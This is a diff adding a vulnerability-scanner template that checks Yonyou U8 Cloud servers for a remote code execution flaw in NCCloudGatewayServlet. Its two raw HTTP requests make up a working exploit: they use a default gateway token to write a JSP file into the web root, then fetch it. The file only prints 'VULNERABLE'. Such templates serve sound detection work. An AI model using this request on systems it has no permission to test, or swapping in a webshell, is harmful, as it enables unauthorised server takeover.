@@ -1,0 +1,74 @@
+id: QVD-2025-37484
+
+info:
+  name: yongyou-u8c-NCCloudGatewayServlet-rce
+  author: clearlu3
+  severity: critical
+  verified: true
+  description: |
+    用友U8cloud用户请求时 token 验证使用默认值并且反射调用缺少限制，导致攻击者可注入任意命令、上传文件从而获取服务器权限。
+  reference:
+    - https://mp.weixin.qq.com/s/kBNb4-ICrLlmqALl0MT-rg
+    - https://mp.weixin.qq.com/s/oQETumjS1PT3Rp8nV5Io0A
+    - https://mp.weixin.qq.com/s/czXk1mvrWN-6TxYaky4nxQ
+  tags: yongyou,rce
+  created: 2025/09/30
+
+set:
+  hostname: request.url.host
+rules:
+  r0:
+    request:
+      raw: |
+        POST /service/NCCloudGatewayServlet HTTP/1.1
+        Host: {{hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+        gatewaytoken:TJ6RT-3FVCB-DPYP8-XF7QM-96FV3
+        Content-Type: application/json
+        Content-Length: 664
+        Connection: keep-alive
+
+        {
+        "groupCode": "1002",
+        "user": "1002",
+        "serviceInfo": {
+        "serviceClassName": "nc.itf.uap.pfxx.IPFxxFileService",
+        "serviceMethodName": "writeDocToXMLFile",
+        "serviceMethodArgInfo": [
+              {
+        "argType": {
+        "body": "java.lang.Byte"
+                },
+        "argValue": {
+        "body": [60, 37, 32, 111, 117, 116, 46, 112, 114, 105, 110, 116, 108, 110, 40, 34, 86, 85, 76, 78, 69, 82, 65, 66, 76, 69, 34, 41, 59, 32, 37, 62]
+                },
+        "agg": false,
+        "isArray": true,
+        "isPrimitive": true
+              },
+              {
+        "argType": {
+        "body": "java.lang.String"
+                },
+        "argValue": {
+        "body": "./webapps/u8c_web/tes44.jsp"
+                },
+        "agg": false,
+        "isArray": false,
+        "isPrimitive": false
+              }
+            ]
+          }
+        }
+    expression: response.status == 200 && response.raw.bcontains(b'tes44.jsp')
+
+  r1:
+    request:
+      raw: |
+        GET /tes44.jsp HTTP/1.1
+        Host: {{hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+        Connection: keep-alive
+    expression: response.status == 200 && response.body.bcontains(b'VULNERABLE')
+
+expression: r0() && r1()
